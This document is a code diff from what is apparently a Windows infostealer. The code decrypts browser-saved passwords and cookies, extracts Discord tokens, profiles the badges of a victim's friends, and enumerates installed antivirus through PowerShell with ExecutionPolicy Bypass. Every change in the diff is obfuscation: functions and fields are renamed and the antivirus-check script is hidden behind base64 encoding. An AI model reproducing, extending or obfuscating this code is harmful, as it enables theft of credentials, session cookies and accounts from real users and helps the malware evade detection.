@@ -291,7 +291,7 @@ def fakegen():
         print(f"An error occurred: {e}")
 
 
-def DecryptValue(buff, master_key=None):
+def dcrvalue(buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
             iv = buff[3:15]
@@ -503,14 +503,9 @@ def systemInfo():
 
 def avs():
     try:
-        script = r'''
-        $filePath = "C:\Users\$env:username\AppData\Local\Temp\winvs.txt"
-        if (-not (Test-Path -Path $filePath)) {
-            New-Item -Path $filePath -ItemType File
-        }
-        Clear-Content -Path $filePath
-        Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" >> $filePath
-        '''
+        script = b64decode('''
+        JGZpbGVQYXRoID0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcQXBwRGF0YVxMb2NhbFxUZW1wXHdpbnZzLnR4dCIKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRmaWxlUGF0aCkpIHsKICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGZpbGVQYXRoIC1JdGVtVHlwZSBGaWxlCiAgICAgICAgfQogICAgICAgIENsZWFyLUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoCiAgICAgICAgUG93ZXJzaGVsbCAtY29tbWFuZCAiR2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdC9TZWN1cml0eUNlbnRlcjIgLUNsYXNzTmFtZSBBbnRpdmlydXNQcm9kdWN0IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZGlzcGxheU5hbWUiID4+ICRmaWxlUGF0aA==
+        ''').decode()
 
         subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script], check=True)
 
@@ -663,19 +658,20 @@ def change_about_me(token):
     except:
         pass
 
-badgeList =  [
-        {"Name": 'Active_Developer','Value': 4194304,'Emoji': '<:active:1045283132796063794> '},
-        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
-        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
-        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
-        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
-        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
-        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
-        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
-        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
-        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
-    ]
+baddglist = [
+    {"N": 'Active_Developer', 'V': 4194304, 'E': '<:active:1045283132796063794> '},
+    {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "<:developer:874750808472825986> "},
+    {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "<:bughunter_2:874750808430874664> "},
+    {"N": 'Early_Supporter', 'V': 512, 'E': "<:early_supporter:874750808414113823> "},
+    {"N": 'House_Balance', 'V': 256, 'E': "<:balance:874750808267292683> "},
+    {"N": 'House_Brilliance', 'V': 128, 'E': "<:brilliance:874750808338608199> "},
+    {"N": 'House_Bravery', 'V': 64, 'E': "<:bravery:874750808388952075> "},
+    {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "<:bughunter_1:874750808426692658> "},
+    {"N": 'HypeSquad_Events', 'V': 4, 'E': "<:hypesquad_events:874750808594477056> "},
+    {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "<:partner:874750808678354964> "},
+    {"N": 'Discord_Employee', 'V': 1, 'E': "<:staff:874750808728666152> "}
+]
+
 
 atfiCount = 0
 atfi = []
@@ -825,11 +821,11 @@ def get_uhq_friends(tokq, max_friends=5):
     for friend in friendlist:
         OwnedBadges = ''
         flags = friend['user']['public_flags']
-        for badge in badgeList:
-            if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
-                    OwnedBadges += badge["Emoji"]
-                flags = flags % badge["Value"]
+        for badge in baddglist:
+            if flags // badge["V"] != 0 and friend['type'] == 1:
+                if not "House" in badge["N"] and not badge["N"] == "Active_Developer":
+                    OwnedBadges += badge["E"]
+                flags = flags % badge["V"]
         if OwnedBadges != '':
             uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
     return uhqlist if uhqlist != '' else "`No HQ Friends`"
@@ -839,10 +835,10 @@ def get_badge(flags):
         return ''
 
     owned_badges = ''
-    for badge in badgeList:
-        if flags // badge["Value"] != 0:
-            owned_badges += badge["Emoji"]
-            flags = flags % badge["Value"]
+    for badge in baddglist:
+        if flags // badge["V"] != 0:
+            owned_badges += badge["E"]
+            flags = flags % badge["V"]
     return owned_badges
 
 def TikTokSession(cookie):
@@ -1602,7 +1598,7 @@ def GetDiscord(path, arg):
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         global Tokqs
-                        TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                        TokqDecoded = dcrvalue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                         if checkTokq(TokqDecoded):
                             if not TokqDecoded in Tokqs:
                                 Tokqs += TokqDecoded
@@ -1618,7 +1614,7 @@ Passw = []
 def getPassw(path, arg):
 
     try:
-        def DecryptValue(buff, master_key=None):
+        def dcrvalue(buff, master_key=None):
             starts = buff.decode(encoding='utf8', errors='ignore')[:3]
             if starts == 'v10' or starts == 'v11':
                 iv = buff[3:15]
@@ -1664,7 +1660,7 @@ def getPassw(path, arg):
                         if not old in paswWords: paswWords.append(old)
                 us = 'emanresU'
                 ur = 'lrU'
-                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
+                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {dcrvalue(row[2], master_key)}")
                 PasswCount += 1
         writeforfile(Passw, 'passw')
     except Exception as e:
@@ -2936,7 +2932,7 @@ def getCook(path, arg):
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
+                Cookies.append(f"{row[0]}     {row[1]}        {dcrvalue(row[2], master_key)}")
                 CookiCount += 1
 
         writeforfile(Cookies, 'cook')
